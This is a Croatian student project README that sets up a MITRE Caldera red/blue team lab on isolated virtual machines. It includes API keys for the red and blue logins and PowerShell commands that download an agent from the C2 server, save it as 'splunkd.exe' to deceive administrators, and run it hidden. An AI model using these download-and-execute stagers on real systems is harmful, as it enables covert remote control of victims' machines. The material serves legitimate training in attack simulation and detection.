# Adversary Simulation with MITRE CALDERA

**Sveučilište u Zagrebu**
**Fakultet organizacije i informatike** </br>
**Kolegij:** Sigurnost informacijskih sustava  
**Mentor:** Izv. prof. dr. sc. Igor Tomičić  
**Studenti:** Mateo Čuvalo, Niko Ivančić, Nikola Lazar, Roberto Šandro  

---

## O projektu
Ovaj repozitorij sadrži dokumentaciju i resurse za projekt simulacije napada i obrane koristeći platformu **MITRE Caldera**. Cilj projekta je demonstrirati automatizaciju "Red Team" aktivnosti (napada) i "Blue Team" aktivnosti (detekcije) u kontroliranom virtualnom okruženju.

## Arhitektura sustava

Sustav se sastoji od dva virtualna stroja unutar izolirane **NAT Network** mreže (`10.0.2.0/24`) hostane na Oracle VirtualBoxu:

1.  **Napadač (Red Team / C2 Server):**
    * OS: Ubuntu Linux 24.04
    * IP: `10.0.2.4` (primjer)
    * Uloga: Vrti MITRE Caldera server u Docker kontejneru.
2.  **Meta (Victim / Blue Team):**
    * OS: Windows Server 2022
    * Uloga: Zaraženo računalo na kojem se izvršavaju agenti i prate logovi (Sysmon).

---

## Postavljanje i Pokretanje (Setup)

### 1. Preuzimanje potrebnih ISO slika
* **Ubuntu Desktop 24.04 LTS:** [Download Link](https://ubuntu.com/download/desktop/thank-you?version=24.04.3&architecture=amd64&lts=true)
* **Windows Server 2022:** [Download Link (Microsoft)](https://go.microsoft.com/fwlink/p/?LinkID=2195280&clcid=0x409&culture=en-us&country=US)

### 2. Pokretanje Caldere (Linux Terminal)
Nakon instalacije Dockera na Linux stroju, Caldera se pokreće sljedećim naredbama:

```bash
cd caldera
sudo docker start caldera-caldera-1
```
## 3. Pristup sučelju (Web Interface)

Nakon pokretanja servera, sučelju se pristupa putem browsera.

* **Za Red Team (na Linuxu):** `http://localhost:8888`
* **Za Blue Team (na Windowsu):** `http://10.0.2.4:8888`
    > **Napomena:** Koristiti IP adresu Linux stroja.

### Podaci za prijavu

| Team | Korisničko ime | API Key / Lozinka |
| :--- | :--- | :--- |
| **Red** | `red` | `f6u75jaE4tgJevBvJBWC4lUc02sMH9QWcI7_cwPHyIU` |
| **Blue** | `blue` | `wgPTqLkrtw3ljJj5wWhalh3SiswlbK5cUOTvjmOs3-M` |

---

## 🕵️‍♂️ Kreiranje Agenata

Agenti se instaliraju na **Windows Server** (žrtvu) putem PowerShell-a.
**Važno:** Potrebno je otvoriti PowerShell kao **Administrator** i izvršiti odgovarajuću skriptu.

### 🔴 Red Agent (Sandcat - splunkd.exe)
Ovaj agent simulira napadača. Skriva se pod imenom `splunkd.exe` kako bi zavarao administratore.

```powershell
$server="[http://10.0.2.15:8888](http://10.0.2.15:8888)";
$url="$server/file/download";
$wc=New-Object System.Net.WebClient;
$wc.Headers.add("platform","windows");
$wc.Headers.add("file","sandcat.go");
$data=$wc.DownloadData($url);
get-process | ? {$_.modules.filename -like "C:\Users\Public\splunkd.exe"} | stop-process -f;
rm -force "C:\Users\Public\splunkd.exe" -ea ignore;
[io.file]::WriteAllBytes("C:\Users\Public\splunkd.exe",$data) | Out-Null;
Start-Process -FilePath C:\Users\Public\splunkd.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
```

## 🔵 Blue Agent (Defender - blue_agent.exe)

Ovaj agent služi za **Blue Team** simulacije i odgovor na incidente. Dizajniran je za tihu instalaciju i komunikaciju s C2 serverom.

### 📥 Instalacija i Pokretanje

Kopirajte i pokrenite sljedeću naredbu u **PowerShell** terminalu (preporučuje se *Run as Administrator*):

```powershell
$server="[http://10.0.2.15:8888](http://10.0.2.15:8888)";
$url="$server/file/download";
$wc=New-Object System.Net.WebClient;
$wc.Headers.add("platform","windows");
$wc.Headers.add("file","sandcat.go");
$data=$wc.DownloadData($url);
get-process | ? {$_.modules.filename -like "C:\Users\Public\blue_agent.exe"} | stop-process -f;
rm -force "C:\Users\Public\blue_agent.exe" -ea ignore;
[io.file]::WriteAllBytes("C:\Users\Public\blue_agent.exe",$data) | Out-Null;
Start-Process -FilePath C:\Users\Public\blue_agent.exe -ArgumentList "-server $server -group blue" -WindowStyle hidden;
```
